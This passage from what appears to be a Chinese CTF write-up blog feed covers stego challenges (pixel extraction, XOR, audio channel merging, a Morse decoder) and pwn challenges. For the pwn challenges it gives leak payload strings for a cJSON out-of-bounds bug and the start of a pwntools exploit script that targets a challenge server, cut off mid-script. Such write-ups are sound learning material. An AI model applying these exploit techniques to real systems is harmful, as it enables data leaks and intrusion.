class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">img0=Image.new(<span class=\"string\">&#x27;RGB&#x27;</span>,(<span class=\"number\">100</span>,<span class=\"number\">133</span>))</span><br><span class=\"line\">img1=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./fumo.png&#x27;</span>)</span><br><span class=\"line\">w,h=img1.size</span><br><span class=\"line\">i=<span class=\"number\">1</span></span><br><span class=\"line\">ni=<span class=\"number\">0</span></span><br><span class=\"line\">j=<span class=\"number\">1</span></span><br><span class=\"line\">nj=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;w:</span><br><span class=\"line\">\tj=<span class=\"number\">1</span></span><br><span class=\"line\">\tnj=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> j&lt;h:</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(j==<span class=\"number\">1198</span>):</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\timg0.putpixel((ni,nj),img1.getpixel((i,j)))</span><br><span class=\"line\">\t\tj=j+<span class=\"number\">9</span></span><br><span class=\"line\">\t\tnj=nj+<span class=\"number\">1</span></span><br><span class=\"line\">\ti=i+<span class=\"number\">9</span></span><br><span class=\"line\">\tni=ni+<span class=\"number\">1</span></span><br><span class=\"line\">img0.show()</span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436814/Typera/2023/04/244e58d3d0b2a5daf7ee5837e5d8beb1.png\" alt=\"SM4\" /></p>\n<h4 id=\"xor\"><a class=\"anchor\" href=\"#xor\">#</a> XOR</h4>\n<p>前面得到的两张图均为 133x50，而第二张图 100x133，这不是巧了，<br />\n前两张张图加在一起，跟后面的那张长宽一样，再结合题目 fumo_xor_cli<br />\nemm... XOR 啊<br />\n思路就有了，<s>结果就拼图这一步，方向错了〒▽〒</s><br />\n先观察一下四个角的像素点，把那两张图旋转一下，拼在一起<br />\n最后使用 stegsolve 异或一下就可以了<br />\n可能是因为拼图做的太糙了，所以异或出来的图有亿点不太对劲<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436840/Typera/2023/04/a7cb74294bd4da8aa2f732cbc86f4c4b.bmp\" alt=\"SM5\" /><br />\nps 处理了一下总算好看了<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436868/Typera/2023/04/8898d7e36e8d29377d803605af7967da.png\" alt=\"SM6\" /></p>\n<h3 id=\"in_the_vaporwaves117118\"><a class=\"anchor\" href=\"#in_the_vaporwaves117118\">#</a> in_the_vaporwaves（1.17/1.18）</h3>\n<p>此前我对音频隐写了解甚少，只会简单地使用 Audacity，对音频文件做一些基本的观察、操作，<br />\n本题中涉及到 Python 的 wave 库使用，那就可以正好趁这个机会去学习一下。</p>\n<h4 id=\"观察原文件\"><a class=\"anchor\" href=\"#观察原文件\">#</a> 观察原文件</h4>\n<p>通过 Audacity 打开 c.wav，播放的时候稍微有点杂音，但听不出有什么不太对的地方 (/▽＼)<br />\n 放大来看，可以看出左右声道的波形貌似正好上下相反：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436891/Typera/2023/04/942c468dbd87e4787052099f715283e8.png\" alt=\"image-20230425233447828\" /></p>\n<h4 id=\"1使用wave库\"><a class=\"anchor\" href=\"#1使用wave库\">#</a> ①使用 Wave 库</h4>\n<p>使用 python 的 Wave 库将左右声道加起来，导出为一个 a.wav 的文件</p>\n<blockquote>\n<p><strong>nchannels</strong>: 声道数，<strong>sampwidth</strong>: 量化位数，<strong>framerate</strong>: 采样频率，<strong>nframes</strong>: 采样点数</p>\n</blockquote>\n<p>Wave 写入对象</p>\n<blockquote>\n<p><strong>Wave_write.setnchannels(n)</strong><br />\n 设置声道数。</p>\n</blockquote>\n<blockquote>\n<p><strong>Wave_write.setsampwidth(n)</strong><br />\n 设置采样字节长度为 n。</p>\n</blockquote>\n<blockquote>\n<p><strong>Wave_write.setframerate(n)</strong><br />\n 设置采样频率为 n。</p>\n</blockquote>\n<blockquote>\n<p>Wave_write.writeframes(data)<br />\n 写入音频帧并确保 nframes 是正确的。 如果输出流不可查找且在 data 被写入之后写入的总帧数与之前设定的 nframes 值不匹配将会引发错误。</p>\n</blockquote>\n<p>Write 读取对象</p>\n<blockquote>\n<p><strong>Wave_read.getnframes()</strong><br />\n 返回音频总帧数。<br />\n<strong>Wave_read.readframes(n)</strong><br />\n 读取并返回以 bytes 对象表示的最多 n 帧音频。</p>\n</blockquote>\n<p>struct 库：将字节串解读为打包的二进制数据</p>\n<blockquote>\n<p><strong>struct.unpack(format, buffer)</strong><br />\n 根据格式字符串 format 从缓冲区 buffer 解包（假定是由 pack (format, ...) 打包）。 结果为一个元组，即使其只包含一个条目。 缓冲区的字节大小必须匹配格式所要求的大小，如 calcsize () 所示。<br />\n<strong>struct.pack(format, v1, v2, ...)</strong><br />\n 返回一个 bytes 对象，其中包含根据格式字符串 format 打包的值 v1, v2, ... 参数个数必须与格式字符串所要求的值完全匹配。</p>\n</blockquote>\n<p>参照官方 wp，编写的脚本：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> wave</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">with</span> wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;c.wav&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> c:</span><br><span class=\"line\">\t<span class=\"keyword\">with</span> wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;a.wav&quot;</span>,<span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> a:</span><br><span class=\"line\">\t\ta.setnchannels(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\ta.setsampwidth(<span class=\"number\">2</span>)  <span class=\"comment\">#此处量化位数应改为2</span></span><br><span class=\"line\">\t\ta.setframerate(<span class=\"number\">44100</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(c.getnframes()):</span><br><span class=\"line\">\t\t\tl,r=struct.unpack(<span class=\"string\">&#x27;hh&#x27;</span>, c.readframes(<span class=\"number\">1</span>))</span><br><span class=\"line\">\t\t\td=l+r</span><br><span class=\"line\">\t\t\ta.writeframes(struct.pack(<span class=\"string\">&#x27;h&#x27;</span>,d))</span><br></pre></td></tr></table></figure><br />\n 但是，实际运行的时候，我发现这个脚本貌似有点问题...<br />\n 如果直接套用运行出来的音频长这样：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436900/Typera/2023/04/c6b92eaad52ca5f54cbb80e1c01191cc.png\" alt=\"image-20230425233457628\" /><br />\n 然后我仔细检查发现，官方 wp 的量化位数设成了 1，改成 2 就可以了... (。_。)<br />\n（着实花了我好久，还以为是我自己写错了）<br />\n出来的 a.wav 如下图<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436908/Typera/2023/04/47a2223d0102f0f858b27c6b0cc851ae.png\" alt=\"image-20230425233505802\" /></p>\n<p>但是，这脚本运行的时间也太长了吧，<strong>[Finished in 262.9s]</strong>  (￣▽￣)&quot;<br />\n 所以我又找到了一个比较快捷的方法：</p>\n<h4 id=\"2ffmpeg\"><a class=\"anchor\" href=\"#2ffmpeg\">#</a> ②ffmpeg</h4>\n<p>使用 ffmpeg 进行双声道合并，<br />\n从<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mZm1wZWcub3Jn\">链接</span>（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qb2hudmFuc2lja2xlLmNvbS9mZm1wZWcvJUVGJUJDJTg5JUU0JUI4JThCJUU4JUJEJUJEZmZtcGVnJUU1JTg4JUIwTGludXglRTclOEUlQUYlRTUlQTIlODMlRTQlQjglOEIlRUYlQkMlOEMlRTglQkYlOTAlRTglQTElOEMlRUYlQkMlOUE=\">https://johnvansickle.com/ffmpeg/）下载 ffmpeg 到 Linux 环境下，运行：</span><br />\n <code>ffmpeg -i c.wav -f wav -ac 1 -ab 128k -y 1_dan1.wav</code>  命令，<br />\n获得 a.wav 文件。</p>\n<p>这次得到的 a.wav 是这样的：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436919/Typera/2023/04/6e8ff45b5b28216617a2427f50628c81.png\" alt=\"image-20230425233516666\" /><br />\n 差别不大～<br />\n 这就是比较常规的摩斯密码了，转换后得到 flag</p>\n<h4 id=\"摩斯电码音频转文字119\"><a class=\"anchor\" href=\"#摩斯电码音频转文字119\">#</a> 摩斯电码音频转文字（1.19）</h4>\n<p>emm... 我顺带研究了一下，如何用 python 把摩斯密码从音频文件里直接读出来，<br />\n这个脚本我另外找了一道题试验了一下，应该是没啥问题的，<br />\n（它只适用于单声道的摩斯电码，所以使用前要先处理好音频文件）<br />\n稀烂的编程水平就不提了，代码如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> wave</span><br><span class=\"line\"><span class=\"keyword\">from</span> scipy.io <span class=\"keyword\">import</span> wavfile</span><br><span class=\"line\"></span><br><span class=\"line\">filename = <span class=\"string\">&#x27;a.wav&#x27;</span></span><br><span class=\"line\">WAVE = wave.<span class=\"built_in\">open</span>(filename)</span><br><span class=\"line\">sample_frequency, audio_sequence = wavfile.read(filename)</span><br><span class=\"line\">space=[]</span><br><span class=\"line\">voice=[]</span><br><span class=\"line\">l1=<span class=\"number\">0</span></span><br><span class=\"line\">l2=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(WAVE.getparams().nframes):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(audio_sequence[i]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i]&gt;=-<span class=\"number\">10</span>):</span><br><span class=\"line\">        l1=l1+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span>((audio_sequence[i-<span class=\"number\">1</span>]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i-<span class=\"number\">1</span>]&gt;=-<span class=\"number\">10</span>) <span class=\"keyword\">and</span> (audio_sequence[i]&gt;<span class=\"number\">10</span> <span class=\"keyword\">or</span> audio_sequence[i]&lt;-<span class=\"number\">10</span>)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> l1&gt;<span class=\"number\">1</span>:</span><br><span class=\"line\">            space.append(l1)</span><br><span class=\"line\">        l1=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(WAVE.getparams().nframes):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(audio_sequence[i]&gt;<span class=\"number\">10</span> <span class=\"keyword\">or</span> audio_sequence[i]&lt;-<span class=\"number\">10</span>):</span><br><span class=\"line\">        l2=l2+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span>((audio_sequence[i-<span class=\"number\">1</span>]&gt;<span class=\"number\">10</span> <span class=\"keyword\">or</span> audio_sequence[i-<span class=\"number\">1</span>]&lt;-<span class=\"number\">10</span>) <span class=\"keyword\">and</span> (audio_sequence[i]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i]&gt;=-<span class=\"number\">10</span>) <span class=\"keyword\">and</span> (audio_sequence[i+<span class=\"number\">1</span>]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i+<span class=\"number\">1</span>]&gt;=-<span class=\"number\">10</span>)):</span><br><span class=\"line\">        voice.append(l2)</span><br><span class=\"line\">        l2=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">m_s=<span class=\"built_in\">min</span>(space)</span><br><span class=\"line\">M_s=<span class=\"built_in\">max</span>(space[<span class=\"number\">1</span>:])</span><br><span class=\"line\">m_v=<span class=\"built_in\">min</span>(voice)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tran</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(voice[i]//m_v==<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;.&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;-&#x27;</span></span><br><span class=\"line\">Str=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(space)):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(space[i]//m_s==<span class=\"number\">1</span>):</span><br><span class=\"line\">        Str=Str+tran(i)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span>(space[i]&gt;M_s):</span><br><span class=\"line\">    \tvoice.insert(i,voice[i])</span><br><span class=\"line\">    \tStr=Str+<span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        Str=Str+tran(i)+<span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">Str=Str+tran(<span class=\"built_in\">len</span>(voice)-<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> (Str)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> pwn</h2>\n<blockquote>\n<p>pwn 部分... 由于我手残删掉了保存源文件，最后只问学长要到了其中两道题的，对我复现造成了极大的困扰，不过幸好这次的官方 wp 挺详细的，还可以对着 wp 一点一点的想，但我是菜鸡本菜，还是花了超多的时间去复现 ╥﹏╥... 不过总体来说收获还是挺多的</p>\n</blockquote>\n<h3 id=\"dataleak129\"><a class=\"anchor\" href=\"#dataleak129\">#</a> Dataleak（1.29）</h3>\n<p><s>（隔了挺久的... 除了中间混了个 hgame，还有 HWS 入营赛 (虽然太菜了没啥用)，当然还有在认真地摸鱼啦）</s></p>\n<p>连上远程，需要 leak 的数据长度为 22，<br />\nIDA 查看 cJSON_PWN：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436929/Typera/2023/04/4dcc2553fda4e522e344eccb3f71b8fd.png\" alt=\"image-20230425233526169\" /><br />\n 内存结构还是比较清楚的<br />\n按定义顺序，先是 buf，然后是 v5，最后是 v6 (存要 leak 的数据的地方)<br />\n 两次循环，每次 buf、v5，写入数据长 14，结尾均有 \\x00<br />\n 每次 cJSON_Minify () 先处理 buf 的字符，然后读出 v5 中 11 字节</p>\n<h4 id=\"漏洞点\"><a class=\"anchor\" href=\"#漏洞点\">#</a> 漏洞点</h4>\n<p>一共应该有两个漏洞点，可以从给的 so 文件中查看，</p>\n<ul>\n<li>处理 /* 的时候，会不断遍历中间的字符直到遇到 \\x00 <s>（或 */ ）</s>，可能造成越界<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436937/Typera/2023/04/560f7380f89320b8d0bfa86942368be9.png\" alt=\"image-20230425233533907\" /></li>\n<li>处理 &quot; 的时候，如果遇到 \\ ，会越过两个字符<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436946/Typera/2023/04/0d185944b3f9a89c3f0cebb68e2e1cdd.png\" alt=\"image-20230425233541340\" /></li>\n</ul>\n<p>其中，第一个漏洞会将遍历到的字符舍去，所以后续的字符会填充到遍历过的字符位置上（包括 /*），而第二个漏洞只会越过 \\ 后的两个字符，中间遍历的字符将会保留。</p>\n<p>所以会有多个方法实现 data 的泄露，而第一个漏洞能够达成的效果强于第二个，所以可以全程使用第一个漏洞完成泄露</p>\n<h4 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h4>\n<p>由于一次只能读取 11 个字符，所以需要 leak 两次，<br />\n但大致思路就是要利用漏洞，先越过 buf 后的 \\x00，让 cJSON_PWN 能继续处理 v5 的字符，<br />\n然后变换 /* 的位置，将 v5 内的字符替换为我们所需要的 data</p>\n<h5 id=\"方法1\"><a class=\"anchor\" href=\"#方法1\">#</a> 方法 1</h5>\n<p>如果两个漏洞都想利用到的话，可以先使用第二个漏洞，将 \\ 出现的位置放在 buf 的末尾（就是第 14 个字符），从而越过后面的 \\x00 继续处理 v5，<br />\n然后 /* 放在 v5 的开头，直接替换后面 16 个 data 的位置（算上开头的 /* 和末尾的 \\x00 一共 16 个）<br />\n<strong>exp1：</strong> <code>&quot;aaaaaaaaaaaa\\/*aaaaaaaaaaaa</code> <br />\n 获得前 11 个 data</p>\n<p>要获得后 11 个 data，必须要把前 11 个 data 放到 buf 里面，才能让后 11 个 buf 出现在 v5 里被读出来，<br />\n这里再用第二个漏洞实在是太麻烦了（仔细想了想，<strong>貌似也不可能</strong>），所以就用第一个解决。</p>\n<p>一个的 /* 直接放在开头，把后面的 16 个字符换进来，另一个的 /* 放在第 6 个字符的位置，这样加上后面包括 \\x00 在内的字符，一共有 11 个，<br />\n这样就把前 11 个 data 再换到 buf 里面，这样后 11 个 data 就正好再 v5 里面被读取<br />\n<strong> exp2：</strong> <code>/*aaaaaaaaaaaaaaaaa/*aaaaaaa</code> <br />\n 获得后 11 个 data。（实际上<strong> exp2</strong> 前后两个可以颠倒，效果一致，因为这里的 exp 无论是先换 16 个字符还是先换那 11 个，都是一样的）</p>\n<h5 id=\"方法2\"><a class=\"anchor\" href=\"#方法2\">#</a> 方法 2</h5>\n<p>方法 2 只变了 leak 前 11 个 data 的方法，后 11 个 data 的方式是一致的<br />\n把 /* 放在 buf 的末尾，算上 \\x00 一共会替换 4 个字符，为防止 data 的前 4 个字符被换进 buf，先用 aaaa 组成 v5 的前 4 个，然后再加上 /* ，替换出后面的 data<br />\n<strong>exp：</strong> <code>aaaaaaaaaaaa/*aaaa/*aaaaaaaa</code></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-YUSA%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-YUSA%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/",
            "title": "西湖论剑_YUSA的小秘密",
            "date_published": "2021-11-29T15:02:55.000Z",
            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"yusa的小秘密\"><a class=\"anchor\" href=\"#yusa的小秘密\">#</a> YUSA 的小秘密</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC95dXNhX3NtYWxsX3NlY3JldC56aXA=\">附件下载</span><br />\n题目描述：LSB，但又不是 LSB，众所周知不止 RGB...<br />\n 直接用 stegsolve 打开有两个通道能直接看到 flag，可是噪点实在太多了.<br />\n 联想到题目描述，开始查找资料.<br />\n 可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ieXRlY3RmLmZlaXNodS5jbi9kb2NzL2RvY2NucXpwR0NXSDFoa0RmNWxqR2RqT0pZZyNxSFJVQ1I=\"> Bytectf2020 的 Misc: Hardcore Watermark 01</span> 这道题</p>\n<blockquote>\n<p>图片中每个像素可以通过三个通道来表示，常见的是 <strong>R</strong> (red) <strong>G</strong> (green) <strong>B</strong> (blue) 模式。而本题用到的通道是 YCrCb。</p>\n</blockquote>\n<p>通过  <code>cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb)</code>  对 img 图片数据进行色彩空间转换，<br />\n然后保存图片：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> cv2 <span class=\"keyword\">import</span> cv2</span><br><span class=\"line\">img = cv2.imread(<span class=\"string\">&#x27;Yusa.png&#x27;</span>)</span><br><span class=\"line\">cv_color = cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb)</span><br><span class=\"line\">cv2.imwrite(<span class=\"string\">&#x27;img.png&#x27;</span>, cv_color)</span><br></pre></td></tr></table></figure><br />\n 再用 stegsolve 看一下通道就可以了<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436506/Typera/2023/04/0c489cb73329a1ef49146321f8fde3bd.png\" alt=\"image-20230425232822379\" /></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/L3H2021-PWN/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/L3H2021-PWN/",
            "title": "L3H2021 PWN部分",
            "date_published": "2021-11-29T14:47:41.000Z",
            "content_html": "<h2 id=\"spn1126\"><a class=\"anchor\" href=\"#spn1126\">#</a> spn(11.26)</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC9wd25fc3BuLnppcA==\">附件下载</span><br />\n复现这道题的时候，我一开始用的是 0RAYS 的解法，大致是找 spn 的解密脚本，计算给出的 shell 的真实地址，然后用 tcache 打 shell，最后选 5 进 backdoor.<br />\n 虽说是读懂了 0RAYS 的脚本，而且也算是进一步学习了一下 tcache 的机制，<br />\n然而我一番搜索，着实找不到好用的 spn 解密脚本，就只好另寻出路.<br />\n0RAY 的脚本放上：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">local=<span class=\"number\">0</span></span><br><span class=\"line\">binary_name=<span class=\"string\">&#x27;SPN_ENC&#x27;</span></span><br><span class=\"line\">libc_name=<span class=\"string\">&#x27;lib/libc-2.27.so&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p=process(<span class=\"string\">&quot;./&quot;</span>+binary_name)</span><br><span class=\"line\">    libc=ELF(<span class=\"string\">&quot;./&quot;</span>+libc_name)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p=remote(<span class=\"string\">&#x27;124.71.194.126&#x27;</span>,<span class=\"number\">9999</span>)</span><br><span class=\"line\">    e=ELF(<span class=\"string\">&quot;./&quot;</span>+binary_name)</span><br><span class=\"line\">    libc=ELF(<span class=\"string\">&quot;./&quot;</span>+libc_name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">z</span>(<span class=\"params\">a=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> local:</span><br><span class=\"line\">        gdb.attach(p,a)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a==<span class=\"string\">&#x27;&#x27;</span>:</span><br><span class=\"line\">            raw_input</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">ru=<span class=\"keyword\">lambda</span> x:p.recvuntil(x)</span><br><span class=\"line\">sl=<span class=\"keyword\">lambda</span> x:p.sendline(x)</span><br><span class=\"line\">sd=<span class=\"keyword\">lambda</span> x:p.send(x)</span><br><span class=\"line\">sa=<span class=\"keyword\">lambda</span> a,b:p.sendafter(a,b)</span><br><span class=\"line\">sla=<span class=\"keyword\">lambda</span> a,b:p.sendlineafter(a,b)</span><br><span class=\"line\">ia=<span class=\"keyword\">lambda</span> :p.interactive()</span><br><span class=\"line\"><span class=\"comment\"># 这里真的是学到了，不过也是我之前看大佬的wp太少的缘故，之前我还在傻傻地一个字一个字地敲(+_+)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_address</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(context.arch==<span class=\"string\">&#x27;i386&#x27;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        <span 